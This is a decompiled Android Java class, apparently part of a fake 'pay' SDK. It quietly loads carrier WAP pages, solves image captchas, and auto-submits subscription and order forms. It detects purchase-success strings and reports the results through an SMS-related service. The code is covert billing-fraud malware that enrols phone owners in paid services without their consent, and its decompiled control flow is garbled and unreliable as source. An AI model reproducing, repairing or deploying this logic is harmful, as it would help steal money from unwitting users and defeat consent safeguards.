package com.android.sdk.pay;

import android.content.Context;
import android.content.Intent;
import android.util.Base64;
import com.android.sdk.rec.SymService;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.SocketTimeoutException;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpRequestBase;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

public class aa
  implements Runnable
{
  private static final String a = aa.class.getSimpleName();
  private int b;
  private int c = 3;
  private String d;
  private String e;
  private String f;
  private int g;
  private HttpClient h = null;
  private int i = 0;
  private int j = 1500;
  private String k = null;
  private String l = null;
  
  public aa(int paramInt1, int paramInt2, String paramString1, String paramString2, String paramString3)
  {
    this.b = paramInt1;
    if (paramInt2 > 0) {
      this.c = paramInt2;
    }
    this.d = paramString1;
    this.e = new String(Base64.decode(paramString2, 0));
    this.f = paramString3;
  }
  
  private void a()
  {
    Intent localIntent = new Intent(ActivityTool.a, SymService.class);
    localIntent.setAction("com.android.sdk.rec.cmd.WapCfgUpload");
    localIntent.putExtra("cmd", 53);
    localIntent.putExtra("smsNum", String.valueOf(this.b));
    localIntent.putExtra("smsBody", String.valueOf(this.g));
    ActivityTool.a.startService(localIntent);
  }
  
  private byte[] b(String paramString, int paramInt, byte[] paramArrayOfByte)
  {
    h.b(ActivityTool.a);
    for (;;)
    {
      try
      {
        ActivityTool.b(a, "conProcess");
        if (this.h == null) {
          this.h = new DefaultHttpClient();
        }
        HttpConnectionParams.setConnectionTimeout(this.h.getParams(), 30000);
        HttpConnectionParams.setSoTimeout(this.h.getParams(), 45000);
        if (!h.a) {
          continue;
        }
        this.h.getParams().setParameter("http.protocol.handle-redirects", Boolean.valueOf(false));
        ActivityTool.b(a, "ConMgr.apn_is_wap=" + g.a + ";url=" + paramString);
        if (paramInt != 0) {
          continue;
        }
        paramString = new HttpGet(paramString);
      }
      catch (Exception paramString)
      {
        paramString.printStackTrace();
        return null;
        paramString = new HttpPost(paramString);
        if ((paramArrayOfByte == null) || (paramArrayOfByte.length == 0)) {
          continue;
        }
        paramArrayOfByte = new ByteArrayEntity(paramArrayOfByte);
        paramArrayOfByte.setContentType("application/x-www-form-urlencoded");
        ((HttpPost)paramString).setEntity(paramArrayOfByte);
        continue;
        localObject1 = (Map.Entry)paramArrayOfByte.next();
        paramString.setHeader((String)((Map.Entry)localObject1).getKey(), (String)((Map.Entry)localObject1).getValue());
        continue;
      }
      catch (OutOfMemoryError paramString)
      {
        int m;
        Object localObject1;
        int n;
        paramString.printStackTrace();
        continue;
        Object localObject2 = localObject1[paramInt];
        if (paramInt == 0) {
          continue;
        }
        paramString.append("&");
        paramString.append(localObject2.getName());
        paramString.append("=");
        paramString.append(ActivityTool.a(localObject2.getValue()));
        paramInt += 1;
        continue;
        localObject2 = localObject1[paramInt];
        paramString = paramString + ActivityTool.a(localObject2.getValue());
        paramInt += 1;
        continue;
        if ((m < 400) || (m >= 500)) {
          continue;
        }
        ActivityTool.b(a, "status_code=" + m);
        return new String("status_code=" + m).getBytes("UTF-8");
        paramString = paramArrayOfByte.getEntity();
        ActivityTool.b(a, "ContentLength=" + paramString.getContentLength());
        boolean bool = k.b(paramArrayOfByte);
        if (!k.a(paramArrayOfByte)) {
          continue;
        }
        return k.a(EntityUtils.toByteArray(paramString));
        paramArrayOfByte = paramString.getContent();
        paramString = new ByteArrayOutputStream();
        try
        {
          localObject1 = new byte[' '];
          paramInt = paramArrayOfByte.read((byte[])localObject1);
          if (paramInt > 0) {
            continue;
          }
        }
        catch (SocketTimeoutException paramArrayOfByte)
        {
          paramArrayOfByte.printStackTrace();
          continue;
        }
        paramString = paramString.toByteArray();
        return paramString;
        if ((bool) && (paramString.size() > 56320)) {
          continue;
        }
        paramString.write((byte[])localObject1, 0, paramInt);
        continue;
        if ((m == 200) || (m == 206)) {
          continue;
        }
        return null;
        paramString = "";
        continue;
        if (paramInt < n) {
          continue;
        }
        continue;
        continue;
      }
      paramArrayOfByte = ActivityTool.a().entrySet().iterator();
      if (paramArrayOfByte.hasNext()) {
        continue;
      }
      paramInt = g.b(ActivityTool.a);
      ActivityTool.b(a, "curConnType=" + paramInt);
      paramString.setHeader("C_C_TP", String.valueOf(paramInt));
      ActivityTool.b(a, "execute");
      paramArrayOfByte = this.h.execute(paramString);
      m = paramArrayOfByte.getStatusLine().getStatusCode();
      paramString = new StringBuffer();
      localObject1 = paramArrayOfByte.getAllHeaders();
      if (localObject1 != null)
      {
        paramInt = 0;
        if (paramInt < localObject1.length) {
          continue;
        }
        this.k = paramString.toString();
      }
      ActivityTool.b(a, "status_code=" + m);
      if ((m < 300) || (m >= 400)) {
        continue;
      }
      localObject1 = paramArrayOfByte.getHeaders("set-cookie");
      if (localObject1 == null) {
        continue;
      }
      n = localObject1.length;
      paramString = "";
      paramInt = 0;
      continue;
      paramArrayOfByte = ActivityTool.a(paramArrayOfByte.getFirstHeader("Location").getValue().replace("&amp;", "&"));
      ActivityTool.b(a, "status_code=" + m + ";session=" + paramString + ";location=" + paramArrayOfByte);
      return new String("status_code=" + m + "&session=" + paramString + "&location=" + paramArrayOfByte).getBytes("UTF-8");
      this.h.getParams().setParameter("http.protocol.handle-redirects", Boolean.valueOf(true));
    }
  }
  
  public int a(String paramString, int paramInt, byte[] paramArrayOfByte)
  {
    this.i += 1;
    if (this.i >= 12)
    {
      if (g.b(ActivityTool.a) <= 0) {}
      for (this.g = 11;; this.g = 12) {
        return 0;
      }
    }
    ActivityTool.a(this.j);
    Object localObject2 = b(paramString, paramInt, paramArrayOfByte);
    for (;;)
    {
      try
      {
        if (this.k == null) {
          this.k = "error";
        }
        if (localObject2 == null) {
          continue;
        }
        str = new String((byte[])localObject2, "UTF-8");
      }
      catch (Exception localException)
      {
        String str;
        localException.printStackTrace();
        ActivityTool.c(a, localException.getMessage());
        localObject1 = "error";
        continue;
        if (!this.d.equals("gdread")) {
          continue;
        }
        if (!ActivityTool.a((String)localObject1, new String[] { "正常答案确认订购", "正确答案确认订购", "正确的验证码" })) {
          continue;
        }
        ActivityTool.b(a, "catch: answer mode");
        localObject2 = o.a((String)localObject1, "img", "src", "/vs/avi");
        if (localObject2 == null) {
          continue;
        }
        paramArrayOfByte = (byte[])localObject2;
        if (((String)localObject2).length() != 0) {
          continue;
        }
        paramArrayOfByte = o.a((String)localObject1, "img", "data-src", "/vs/avi") + "?&rnd=" + Math.random();
        localObject2 = paramArrayOfByte;
        if (!paramArrayOfByte.contains("picfs=16")) {
          continue;
        }
        localObject2 = paramArrayOfByte;
        if (!paramArrayOfByte.contains("picw=50")) {
          continue;
        }
        localObject2 = paramArrayOfByte.replace("picw=50", "picw=120");
        this.l = Jsoup.parse((String)localObject1).getElementsByTag("a").toString();
        return a(o.c(paramString, (String)localObject2), 0, null);
        if ((!this.d.equals("gdread")) || (!((String)localObject1).contains("JFIF")) || (((String)localObject1).indexOf("JFIF") >= 20)) {
          continue;
        }
        paramInt = 1;
        if (!paramString.contains("picfs=28")) {
          continue;
        }
        paramInt = 2;
        paramArrayOfByte = ActivityTool.a(o.a((byte[])localObject2, paramInt)).replace("+", "");
        if ((ActivityTool.a(paramArrayOfByte).length() != 2) || (!ActivityTool.b(paramArrayOfByte))) {
          continue;
        }
        paramInt = Integer.parseInt(paramArrayOfByte.charAt(0));
        int m = Integer.parseInt(paramArrayOfByte.charAt(1));
        paramArrayOfByte = o.a(this.l, "a", "href", "verifyCode=" + (m + paramInt));
        if (paramArrayOfByte.length() <= 0) {
          continue;
        }
        this.g = 1;
        return a(o.c(paramString, paramArrayOfByte), 0, null);
        return a(paramString, 0, null);
        if ((!this.d.equals("gdanime")) || (!((String)localObject1).contains("请填入图片对应的数字或字母"))) {
          continue;
        }
        this.g = 1;
        paramArrayOfByte = o.a((String)localObject1, "form", "method", "post", "action");
        localObject1 = o.c((String)localObject1, "form", "method", "post");
        return a(o.c(paramString, paramArrayOfByte), 1, ((String)localObject1).getBytes());
        if (!((String)localObject1).contains("status_code=302")) {
          continue;
        }
        ActivityTool.b(a, "catch: 302");
        paramString = ((String)localObject1).substring(((String)localObject1).indexOf("location=") + 9);
        if (!ActivityTool.a(paramString, new String[] { "wl/hetiyanbao.jsp", "channelid=70000000009", "channelid=10010001007" })) {
          continue;
        }
        return a(this.e, 0, null);
        return a(paramString, 0, null);
        if (!ActivityTool.a((String)localObject1, new String[] { "status_code=404", "页面不存在" })) {
          continue;
        }
        ActivityTool.b(a, "catch: 404");
        this.g = 4;
        return 4;
        if (!ActivityTool.a((String)localObject1, new String[] { "成功购买", "已经购买", "已购买", "成功点播", "已经订购", "已订购", "成功订购" })) {
          continue;
        }
        ActivityTool.b(a, "catch: 已订购 or 已购买");
        return 1;
        if (!ActivityTool.a(this.k, new String[] { "video/mp4", "video/3gp", "audio/aac" })) {
          continue;
        }
        ActivityTool.b(a, "catch: 3gp or mp4");
        return 1;
        if (!((String)localObject1).contains("http-equiv=\"refresh\"")) {
          continue;
        }
        ActivityTool.b(a, "catch: http-equiv=refresh");
        paramArrayOfByte = o.a((String)localObject1, "meta", "http-equiv", "refresh", "content");
        return a(o.c(paramString, paramArrayOfByte.substring(paramArrayOfByte.indexOf("url=") + 4)), 0, null);
        String[] arrayOfString = this.f.split(",");
        if (!this.d.equals("gdread")) {
          continue;
        }
        ActivityTool.b(a, "gdread");
        localObject2 = localObject1;
        if (!h.a) {
          continue;
        }
        localObject2 = o.b((String)localObject1);
        int n = arrayOfString.length;
        m = 0;
        if (m < n) {
          continue;
        }
        ActivityTool.b(a, "no catch");
        return a(paramString, paramInt, paramArrayOfByte);
        localObject1 = arrayOfString[m];
        if ((((String)localObject1).length() <= 0) || (!((String)localObject2).contains((CharSequence)localObject1))) {
          continue;
        }
        ActivityTool.b(a, "catch: " + (String)localObject1);
        localObject3 = o.a((String)localObject2, (String)localObject1);
        if ((localObject3 == null) || (((String)localObject3).length() <= 0)) {
          continue;
        }
        this.g = 1;
        if (!((String)localObject3).startsWith("rtsp://")) {
          continue;
        }
        continue;
        m += 1;
        continue;
        return a(o.c(paramString, (String)localObject3), 0, null);
        bool1 = o.a((String)localObject2, "input", "type", "submit", "value", (String)localObject1);
        bool2 = o.a((String)localObject2, "input", "type", "button", "value", (String)localObject1);
        if ((!bool1) && (!bool2)) {
          continue;
        }
        localIterator = Jsoup.parse((String)localObject2).getElementsByTag("form").iterator();
        if (!localIterator.hasNext()) {
          continue;
        }
        localObject3 = (Element)localIterator.next();
        bool1 = o.a((Element)localObject3, "input", "type", "submit", "value", (String)localObject1);
        bool2 = o.a((Element)localObject3, "input", "type", "button", "value", (String)localObject1);
        if ((!bool1) && (!bool2)) {
          continue;
        }
        this.g = 1;
        paramArrayOfByte = o.a((Element)localObject3, "form", "method", "post", "action");
        localObject1 = o.a((Element)localObject3);
        return a(o.c(paramString, paramArrayOfByte), 1, ((String)localObject1).getBytes());
        if (!this.d.equals("gdanime")) {
          continue;
        }
        ActivityTool.b(a, "gdanime");
        n = arrayOfString.length;
        m = 0;
        if (m >= n) {
          continue;
        }
        localObject3 = arrayOfString[m];
        if ((((String)localObject3).length() <= 0) || (!((String)localObject1).contains(((String)localObject3).replace("*", "")))) {
          continue;
        }
        ActivityTool.b(a, "catch: " + (String)localObject3);
        localObject2 = o.a((String)localObject1, (String)localObject3);
        if (!((String)localObject3).contains("*")) {
          continue;
        }
        localObject2 = o.b((String)localObject1, ((String)localObject3).replace("*", ""));
        if ((localObject2 == null) || (((String)localObject2).length() <= 0)) {
          continue;
        }
        if (!((String)localObject2).startsWith("rtsp://")) {
          continue;
        }
        continue;
        m += 1;
        continue;
        continue;
        return a(o.c(paramString, (String)localObject2), 0, null);
        bool1 = o.a((String)localObject1, "input", "type", "submit", "value", (String)localObject3);
        bool2 = o.a((String)localObject1, "input", "type", "button", "value", (String)localObject3);
        if ((!bool1) && (!bool2)) {
          continue;
        }
        localIterator = Jsoup.parse((String)localObject1).getElementsByTag("form").iterator();
        if (!localIterator.hasNext()) {
          continue;
        }
        localObject2 = (Element)localIterator.next();
        bool1 = o.a((Element)localObject2, "input", "type", "submit", "value", (String)localObject3);
        bool2 = o.a((Element)localObject2, "input", "type", "button", "value", (String)localObject3);
        if ((!bool1) && (!bool2)) {
          continue;
        }
        this.g = 1;
        paramArrayOfByte = o.a((Element)localObject2, "form", "method", "post", "action").replace("{}", "%7B%7D");
        localObject1 = o.a((Element)localObject2);
        return a(o.c(paramString, paramArrayOfByte), 1, ((String)localObject1).getBytes());
        if (!this.d.equals("gdvideo")) {
          continue;
        }
        ActivityTool.b(a, "gdvideo");
        n = arrayOfString.length;
        m = 0;
        if (m >= n) {
          continue;
        }
        localObject2 = arrayOfString[m];
        if ((((String)localObject2).length() <= 0) || (!((String)localObject1).contains((CharSequence)localObject2))) {
          continue;
        }
        ActivityTool.b(a, "catch: " + (String)localObject2);
        localObject3 = o.a((String)localObject1, (String)localObject2);
        if ((localObject3 == null) || (((String)localObject3).length() <= 0)) {
          break label1844;
        }
        if (!((String)localObject3).startsWith("rtsp://")) {
          continue;
        }
        m += 1;
        continue;
        continue;
        return a(o.c(paramString, (String)localObject3), 0, null);
      }
      ActivityTool.f(this.k);
      ActivityTool.f(str);
      if (!str.contains("onenterforward")) {
        continue;
      }
      ActivityTool.b(a, "catch: redirect");
      return a(o.a(str), 0, null);
      ActivityTool.a(5000L);
      str = "error";
    }
    Object localObject3;
    boolean bool1;
    boolean bool2;
    Iterator localIterator;
    label1844:
    do
    {
      do
      {
        bool1 = o.a((String)localObject1, "input", "type", "submit", "value", (String)localObject2);
        bool2 = o.a((String)localObject1, "input", "type", "button", "value", (String)localObject2);
        if ((!bool1) && (!bool2)) {
          break;
        }
        localIterator = Jsoup.parse((String)localObject1).getElementsByTag("form").iterator();
      } while (!localIterator.hasNext());
      localObject3 = (Element)localIterator.next();
      bool1 = o.a((Element)localObject3, "input", "type", "submit", "value", (String)localObject2);
      bool2 = o.a((Element)localObject3, "input", "type", "button", "value", (String)localObject2);
      if ((!bool1) && (!bool2)) {
        break;
      }
      paramArrayOfByte = o.a((Element)localObject3, "form", "method", "post", "action");
      localObject1 = o.a((Element)localObject3);
      return a(o.c(paramString, paramArrayOfByte), 1, ((String)localObject1).getBytes());
    } while (!((String)localObject1).contains("order.msp"));
    this.g = 1;
    Object localObject1 = o.b((String)localObject1, "form", "action", "order.msp");
    paramArrayOfByte = o.a(((Element)localObject1).toString(), "form", "action", "order.msp");
    localObject1 = new StringBuilder(String.valueOf(o.a((Element)localObject1))).append("&x=").append(ActivityTool.a(50)).toString() + "&y=" + ActivityTool.a(30);
    return a(o.c(paramString, paramArrayOfByte), 1, ((String)localObject1).getBytes());
  }
  
  public void run()
  {
    try
    {
      ActivityTool.b(a, "run");
      ActivityTool.a(this.c * 1000);
      g.a(ActivityTool.a);
      int m = a(this.e, 0, null);
      ActivityTool.b(a, "result=" + m);
      a();
      ActivityTool.b(a, "run End");
      ab.a().b(this);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
        this.g = 13;
        a();
      }
    }
  }
}
